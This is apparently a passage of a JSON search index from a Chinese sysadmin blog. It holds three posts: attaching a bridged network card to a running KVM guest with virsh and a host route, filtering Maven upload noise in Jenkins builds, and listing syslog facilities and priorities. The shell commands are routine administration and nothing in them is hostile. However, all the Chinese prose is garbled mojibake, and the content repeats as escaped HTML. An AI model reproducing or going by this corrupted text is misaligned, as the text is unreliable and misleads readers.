TYPE=Ethernet UUID=6b68220d-d5ed-496f-b8d1-4c6d9cbb1234 ONBOOT=yes NM_CONTROLLED=no BRIDGE=br1 å†åšä¸ªç½‘æ¡¥br1\ncat /etc/sysconfig/network-scripts/ifcfg-br1 DEVICE=br1 BOOTPROTO=none ONBOOT=yes TYPE=Bridge æ³¨æ„ï¼Œè¿™ä¸ªç‰©ç†æœºç½‘å¡å’Œç½‘æ¡¥éƒ½æ²¡æœ‰IPåœ°å€ï¼Œå®åœ¨æ˜¯å¯æ€œï¼Œipä¸å¤Ÿç”¨\nç„¶åå¯åŠ¨ä»–ä»¬ï¼š\nifup em3 ifup br1 è™šæœºæŒ‚æ¥æ–°è®¾å¤‡ï¼š\nvirsh attach-interface --domain vis-16-13-28 \\ --type bridge \\ --source br1 --model virtio \\ --mac f0:00:ac:30:2d:1d --config ç„¶åsshç™»å½•è™šæœºï¼Œé…ç½®å¥½è™šæœºä¸­eth1çš„ip/maskï¼Œä¸è¦é…gatewayå•Š\næœ€åç›´æ¥åŠ ä¸»æœºè·¯ç”±ï¼š\nroute add -host 172.17.11.182 dev eth1 pingä¸€ä¸‹å¯¹ç«¯172.17.11.182ï¼Œé€šå°±æå®šäº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240123-kvm_netcard_attach/","summary":"\u003cp\u003eæ¯”è¾ƒå¤æ€ªçš„éœ€æ±‚ï¼Œå…¬å¸æ‹‰äº†æ ¹ä¸“çº¿åˆ°æœºæˆ¿ã€‚\u003c/p\u003e\n\u003cp\u003eè€Œä½¿ç”¨ä¸“çº¿çš„æœºå™¨æ˜¯ä¸€å°kvmè™šæœºï¼Œå®ä½“æœºæœ‰è‡ªå·±çš„è·¯ç”±ï¼Œå®ä½“æœºçš„å‰ä¸¤ä¸ªç½‘å¡åšäº†åŒç½‘å¡bondingã€‚\u003c/p\u003e\n\u003cp\u003eé‚£è™šæœºå°±åªèƒ½ä½¿ç”¨å®æœºçš„ç¬¬ä¸‰å—ç½‘å¡è¿å‡ºå»äº†ï¼Œè€Œä¸”å¿…é¡»åˆ¶å®šhostçš„è·¯ç”±ï¼Œè¿™é‡Œç»™çš„å­ç½‘æ©ç æ˜¯255.255.255.252ï¼Œåªæœ‰2ä¸ªipå¯ä»¥ç”¨ï¼Œæ‰€ä»¥åªèƒ½è™šæœºæœ‰ipï¼Œå®æœºæ ¹æœ¬ä¸èƒ½é…ipåœ°å€ï¼ï¼ï¼\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæŠŠå®æœºdell r720çš„ç¬¬ä¸‰å—ç½‘å¡em3æ”¹ä¸€ä¸‹ï¼Œè¿æ¥åˆ°ç½‘æ¡¥br1\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/sysconfig/network-scripts/ifcfg-em3  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eem3  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eHWADDR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eXX:XX:XX:XX:XX:XX  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eEthernet  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUUID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e6b68220d-d5ed-496f-b8d1-4c6d9cbb1234  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNM_CONTROLLED\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eBRIDGE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå†åšä¸ªç½‘æ¡¥br1\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/sysconfig/network-scripts/ifcfg-br1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eBOOTPROTO\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003enone  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eBridge  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼Œè¿™ä¸ªç‰©ç†æœºç½‘å¡å’Œç½‘æ¡¥éƒ½æ²¡æœ‰\u003ccode\u003eIP\u003c/code\u003eåœ°å€ï¼Œå®åœ¨æ˜¯å¯æ€œï¼Œipä¸å¤Ÿç”¨\u003c/p\u003e\n\u003cp\u003eç„¶åå¯åŠ¨ä»–ä»¬ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifup em3  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifup br1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè™šæœºæŒ‚æ¥æ–°è®¾å¤‡ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh attach-interface --domain vis-16-13-28 \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        --type bridge \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e        --source br1 --model virtio \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e        --mac f0:00:ac:30:2d:1d --config\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åsshç™»å½•è™šæœºï¼Œé…ç½®å¥½è™šæœºä¸­eth1çš„ip/maskï¼Œä¸è¦é…gatewayå•Š\u003c/p\u003e\n\u003cp\u003eæœ€åç›´æ¥åŠ ä¸»æœºè·¯ç”±ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroute add -host 172.17.11.182 dev eth1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003epingä¸€ä¸‹å¯¹ç«¯172.17.11.182ï¼Œé€šå°±æå®šäº†ã€‚\u003c/p\u003e","title":"kvmçš„è™šæœºä¸­å¦‚ä½•åœ¨çº¿æŒ‚æ¥ä¸€å—æ–°ç½‘å¡"},{"content":"æœ€è¿‘åœ¨å¼„jenkinsçš„è‡ªåŠ¨æ‰“åŒ…éƒ¨ç½²\nå‡ºç°ä¸ªé—®é¢˜ï¼Œé¡¹ç›®æ˜¯ç”¨çš„mvnï¼Œæ‰“åŒ…çš„æ—¶å€™ï¼Œå¦‚æœæ˜¯åœ¨æ§åˆ¶å°ä¸‹è¿˜å¥½ã€‚\nå¦‚æœæ˜¯åœ¨jenkinsä¸‹ï¼Œçœ‹console outputï¼Œå¾€ä¸­å¿ƒä»“åº“artifactoryæäº¤åŒ…çš„æ—¶å€™ï¼Œä¼šæ˜¾ç¤ºä¸‹é¢ä¸€å †ï¼š\nUploaded: http://xxx:8081/artifactory/libs-release-local/abc/maven-metadata.xml (315 B at 17.1 KB/sec) Uploading: http://xxx:8081/artifactory/libs-release-local/abc/d/admin-9.1.war 20000/21969 KB 20002/21969 KB 20004/21969 KB 20006/21969 KB 20008/21969 KB 20010/21969 KB 20012/21969 KB 20014/21969 KB 20016/21969 KB 20018/21969 KB 20020/21969 KB 20022/21969 KB 20024/21969 KB 20026/21969 KB 20028/21969 KB 20030/21969 KB 20032/21969 KB 20034/21969 KB 20036/21969 KB 20038/21969 KB 20040/21969 KB 20042/21969 KB 20044/21969 KB ...... é•¿åº¦æ— æ¯”é•¿ï¼Œåƒåœ¾ä¸œè¥¿ã€‚å¦‚ä½•å°†ä¹‹å±è”½å‘¢ï¼Ÿ\né¦–å…ˆå»ä¿®æ”¹mvnçš„æ—¥å¿—çº§åˆ«ï¼Œç¼ºçœæ˜¯INFOï¼Œæé«˜åˆ°WARNï¼š\nMAVEN_OPTS=-Dorg.slf4j.simpleLogger.defaultLogLevel=warn mvn -ff clean install æˆ‘å»ï¼ŒINFOæ˜¯éƒ½æ²¡äº†ï¼Œä½†æ˜¯è¿™ä¸ªå±…ç„¶è¿˜åœ¨ï¼ï¼ï¼ï¼\næŸ¥äº†ä¸‹javaçš„æ—¥å¿—ä¼˜å…ˆçº§ï¼š\nALL \u0026lt; DEBUG \u0026lt; INFO \u0026lt; WARN \u0026lt; ERROR \u0026lt; FATAL \u0026lt; OFF ä¸Šé¢åªæœ‰FATALå’ŒOFFäº†ï¼Œè¯´æ˜è¿™ä¸ªæ˜¯ä¸ªå‰¯äº§å“ï¼Œä¸æ˜¯mvnæ§åˆ¶çš„ï¼Œè€Œæ˜¯ä¸Šä¼ çš„æ—¶å€™äº§ç”Ÿçš„ã€‚\næ²¡åŠæ³•äº†ï¼Œç¥­å‡ºshellå¤§æ³•ï¼š\nmvn -ff clean install | egrep \u0026#34;(^\\[INFO\\])\u0026#34; æŠŠå¼€å¤´æ˜¯[INFO]çš„æ˜¾ç¤ºå‡ºæ¥ï¼Œå¦‚æœä¸å¤Ÿï¼Œè¿˜å¯ä»¥åŠ ä¸Š[DEBUG]\nmvn -ff clean install | egrep \u0026#34;(^\\[INFO\\]|^\\[DEBUG\\])\u0026#34; å¦‚æœè¦å–åï¼Œä¸æ˜¾ç¤ºä»¥[INFO]å’Œ[DEBUG]æ‰“å¤´çš„é‚£äº›è¡Œï¼š\nmvn -ff clean install | egrep -v \u0026#34;(^\\[INFO\\]|^\\[DEBUG\\])\u0026#34; æœ€åï¼Œmvnå…¨é™é»˜ï¼Œåªæœ‰å‡ºé”™æ‰æ˜¾ç¤ºçš„æ–¹å¼ï¼š\nmvn -ff -q clean install è¿™ä¸‹ä¸–ç•Œéƒ½å®‰é™äº†ã€‚\nå†è¯´ä¸€ä¸‹ mvn build å‚æ•°çš„è°ƒè¯•ï¼š\nmvnçš„parent pomé‡Œé¢æŒ‡å®šäº†local file repo\n\u0026lt;repositories\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;project.local\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;project\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;file://${project.basedir}/../repo\u0026lt;/url\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;/repositories\u0026gt; è€Œä¸”æŒ‡å®šäº†-s setting.xmlï¼Œé‡Œé¢ä¹Ÿæœ‰artifactoryçš„repos. åœ¨å­æ¨¡å—moduleé‡Œä¸çŸ¥é“æ˜¯å¦æ­£å¸¸è·å¾—äº†ã€‚\næ‰§è¡Œä¸‹é¢å‘½ä»¤å°±å¯ä»¥äº†ï¼š\nmvn help:evaluate ${project.repositories} ","permalink":"https://rendoumi.com/posts/20240123-mvn_build_log/","summary":"\u003cp\u003eæœ€è¿‘åœ¨å¼„jenkinsçš„è‡ªåŠ¨æ‰“åŒ…éƒ¨ç½²\u003c/p\u003e\n\u003cp\u003eå‡ºç°ä¸ªé—®é¢˜ï¼Œé¡¹ç›®æ˜¯ç”¨çš„mvnï¼Œæ‰“åŒ…çš„æ—¶å€™ï¼Œå¦‚æœæ˜¯åœ¨æ§åˆ¶å°ä¸‹è¿˜å¥½ã€‚\u003c/p\u003e\n\u003cp\u003eå¦‚æœæ˜¯åœ¨jenkinsä¸‹ï¼Œçœ‹console outputï¼Œå¾€ä¸­å¿ƒä»“åº“artifactoryæäº¤åŒ…çš„æ—¶å€™ï¼Œä¼šæ˜¾ç¤ºä¸‹é¢ä¸€å †ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eUploaded: http://xxx:8081/artifactory/libs-release-local/abc/maven-metadata.xml \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e315\u003c/span\u003e B at 17.1 KB/sec\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eUploading: http://xxx:8081/artifactory/libs-release-local/abc/d/admin-9.1.war  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20000/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20002/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20004/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20006/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20008/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20010/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20012/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20014/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20016/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20018/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20020/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20022/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20024/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20026/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20028/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20030/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20032/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20034/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20036/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20038/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20040/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20042/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20044/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé•¿åº¦æ— æ¯”é•¿ï¼Œåƒåœ¾ä¸œè¥¿ã€‚å¦‚ä½•å°†ä¹‹å±è”½å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå»ä¿®æ”¹mvnçš„æ—¥å¿—çº§åˆ«ï¼Œç¼ºçœæ˜¯INFOï¼Œæé«˜åˆ°WARNï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eMAVEN_OPTS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-Dorg.slf4j.simpleLogger.defaultLogLevel\u003cspan class=\"o\"\u003e=\u003c/span\u003ewarn mvn -ff  clean install  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ‘å»ï¼ŒINFOæ˜¯éƒ½æ²¡äº†ï¼Œä½†æ˜¯è¿™ä¸ªå±…ç„¶è¿˜åœ¨ï¼ï¼ï¼ï¼\u003c/p\u003e\n\u003cp\u003eæŸ¥äº†ä¸‹javaçš„æ—¥å¿—ä¼˜å…ˆçº§ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eALL \u0026lt; DEBUG \u0026lt; INFO \u0026lt; WARN \u0026lt; ERROR \u0026lt; FATAL \u0026lt; OFF  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸Šé¢åªæœ‰FATALå’ŒOFFäº†ï¼Œè¯´æ˜è¿™ä¸ªæ˜¯ä¸ªå‰¯äº§å“ï¼Œä¸æ˜¯mvnæ§åˆ¶çš„ï¼Œè€Œæ˜¯ä¸Šä¼ çš„æ—¶å€™äº§ç”Ÿçš„ã€‚\u003c/p\u003e","title":"mvn buildçš„æ—¶å€™æ§åˆ¶æ—¥å¿—è¾“å‡º"},{"content":"é¦–å…ˆæ˜¯ï¼š\n[facility].[priority]\nfacilityè¡¨ç¤ºè®¾å¤‡ã€è®¾æ–½ï¼Œç‰¹åˆ«è£…ç½®ï¼š\nauth # è®¤è¯ç›¸å…³çš„ authpriv # æƒé™,æˆæƒç›¸å…³çš„ cron # ä»»åŠ¡è®¡åˆ’ç›¸å…³çš„ daemon # å®ˆæŠ¤è¿›ç¨‹ç›¸å…³çš„ kern # å†…æ ¸ç›¸å…³çš„ lpr # æ‰“å°ç›¸å…³çš„ mail # é‚®ä»¶ç›¸å…³çš„ mark # æ ‡è®°ç›¸å…³çš„ news # æ–°é—»ç›¸å…³çš„ security # å®‰å…¨ç›¸å…³çš„,ä¸auth ç±»ä¼¼ syslog # syslogè‡ªå·±çš„ user # ç”¨æˆ·ç›¸å…³çš„ uucp # unix to unix cp ç›¸å…³çš„ local0 åˆ° local7 # ç”¨æˆ·è‡ªå®šä¹‰ä½¿ç”¨ * # *è¡¨ç¤ºæ‰€æœ‰çš„facility ä¸€å®šè¦æ³¨æ„ä¸Šé¢çš„ï¼Œlocal0 åˆ° local7 # ç”¨æˆ·è‡ªå®šä¹‰ä½¿ç”¨\npriorityè¡¨ç¤ºä¼˜å…ˆæƒï¼Œæ—¥å¿—ä¼˜å…ˆæƒ(log level),ä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ç§ä¼˜å…ˆæƒ(ä»ä½åˆ°é«˜)ï¼š\ndebug # ç¨‹åºæˆ–ç³»ç»Ÿçš„è°ƒè¯•ä¿¡æ¯ info # ä¸€èˆ¬ä¿¡æ¯, notice # ä¸å½±å“æ­£å¸¸åŠŸèƒ½,éœ€è¦æ³¨æ„çš„æ¶ˆæ¯ warning/warn # å¯èƒ½å½±å“ç³»ç»ŸåŠŸèƒ½,éœ€è¦æé†’ç”¨æˆ·çš„é‡è¦äº‹ä»¶ err/error # é”™è¯¯ä¿¡æ¯ crit # æ¯”è¾ƒä¸¥é‡çš„ alert # å¿…é¡»é©¬ä¸Šå¤„ç†çš„ emerg/oanic # ä¼šå¯¼è‡´ç³»ç»Ÿä¸å¯ç”¨çš„ * # è¡¨ç¤ºæ‰€æœ‰çš„æ—¥å¿—çº§åˆ« none # è·Ÿ* ç›¸å,è¡¨ç¤ºå•¥ä¹Ÿæ²¡æœ‰ syslogçš„æ—¥å¿—ä¼˜å…ˆæƒé»˜è®¤æ˜¯infoï¼Œè¿™æ—¶å€™ç”¨syslogä¸ºdebug(æœ€ä½æ—¥å¿—ä¼˜å…ˆæƒ)æ¥å†™æ—¥å¿—ï¼ŒsyslogæœåŠ¡æ˜¯ä¸ä¼šå†™å…¥æ—¥å¿—çš„ã€‚\n","permalink":"https://rendoumi.com/posts/20240123-syslog_priority/","summary":"\u003cp\u003eé¦–å…ˆæ˜¯ï¼š\u003c/p\u003e\n\u003cp\u003e[facility].[priority]\u003c/p\u003e\n\u003cp\u003efacilityè¡¨ç¤ºè®¾å¤‡ã€è®¾æ–½ï¼Œç‰¹åˆ«è£…ç½®ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauth      \u003cspan class=\"c1\"\u003e# è®¤è¯ç›¸å…³çš„  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauthpriv  \u003cspan class=\"c1\"\u003e# æƒé™,æˆæƒç›¸å…³çš„  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecron      \u003cspan class=\"c1\"\u003e# ä»»åŠ¡è®¡åˆ’ç›¸å…³çš„  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edaemon    \u003cspan class=\"c1\"\u003e# å®ˆæŠ¤è¿›ç¨‹ç›¸å…³çš„  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekern      \u003cspan class=\"c1\"\u003e# å†…æ ¸ç›¸å…³çš„  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elpr       \u003cspan class=\"c1\"\u003e# æ‰“å°ç›¸å…³çš„  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003email      \u003cspan class=\"c1\"\u003e# é‚®ä»¶ç›¸å…³çš„  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emark      \u003cspan class=\"c1\"\u003e# æ ‡è®°ç›¸å…³çš„  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enews      \u003cspan class=\"c1\"\u003e# æ–°é—»ç›¸å…³çš„  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esecurity  \u003cspan class=\"c1\"\u003e# å®‰å…¨ç›¸å…³çš„,ä¸auth ç±»ä¼¼  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esyslog    \u003cspan class=\"c1\"\u003e# syslogè‡ªå·±çš„  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euser      \u003cspan class=\"c1\"\u003e# ç”¨æˆ·ç›¸å…³çš„  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euucp      \u003cspan class=\"c1\"\u003e# unix to unix cp ç›¸å…³çš„  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocal0 åˆ° local7 \u003cspan class=\"c1\"\u003e# ç”¨æˆ·è‡ªå®šä¹‰ä½¿ç”¨  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e*         \u003cspan class=\"c1\"\u003e# *è¡¨ç¤ºæ‰€æœ‰çš„facility\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸€å®šè¦æ³¨æ„ä¸Šé¢çš„ï¼Œ\u003cstrong\u003elocal0 åˆ° local7 # ç”¨æˆ·è‡ªå®šä¹‰ä½¿ç”¨\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003epriorityè¡¨ç¤ºä¼˜å…ˆæƒï¼Œæ—¥å¿—ä¼˜å…ˆæƒ(log level),ä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ç§ä¼˜å…ˆæƒ(ä»ä½åˆ°é«˜)ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edebug           \u003cspan class=\"c1\"\u003e# ç¨‹åºæˆ–ç³»ç»Ÿçš„è°ƒè¯•ä¿¡æ¯  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einfo            \u003cspan class=\"c1\"\u003e# ä¸€èˆ¬ä¿¡æ¯,  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enotice          \u003cspan class=\"c1\"\u003e# ä¸å½±å“æ­£å¸¸åŠŸèƒ½,éœ€è¦æ³¨æ„çš„æ¶ˆæ¯  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewarning/warn    \u003cspan class=\"c1\"\u003e# å¯èƒ½å½±å“ç³»ç»ŸåŠŸèƒ½,éœ€è¦æé†’ç”¨æˆ·çš„é‡è¦äº‹ä»¶  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eerr/error       \u003cspan class=\"c1\"\u003e# é”™è¯¯ä¿¡æ¯  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecrit            \u003cspan class=\"c1\"\u003e# æ¯”è¾ƒä¸¥é‡çš„  